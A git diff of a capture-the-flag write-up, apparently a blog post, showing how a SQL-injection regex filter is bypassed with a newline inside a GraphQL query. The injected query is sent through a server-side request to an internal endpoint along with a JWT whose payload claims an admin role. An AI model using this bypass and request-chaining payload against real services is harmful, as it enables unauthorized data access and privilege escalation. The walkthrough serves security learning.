@@ -521,6 +521,7 @@ function detectSqli (query) {
 - !!!! New line injection , we found our regex bypass!
 - With that in hand, i tried to inject the newline sql injection to break the query and noticed whether any error appeared.[ `{getDataByName(name:"John\n '"){name%20department%20isPresent}}`]
 
+
 ```
 POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
 Host: host:30586
@@ -529,6 +530,8 @@ Content-Length: 89
 
 url=http://0.0.0.0:1337/graphql?query={getDataByName(name:"John\n '"){name%20department%20isPresent}}%26token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJyZXF1aXJlZFJvbGUiOiJhZG1pbiIsImlhdCI6MTcxNjIxMjM3M30.Cf49E4-_dHEoTBfMfplbKikF1ns-LDjWR5ftHG-9bfk
 ```
+
+![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/sql.jpg)
 
 - We got through this ! now we need to somehow escalate this sqli to read the flag.
 - The flag.txt was compiled as a binary named `/readflag`
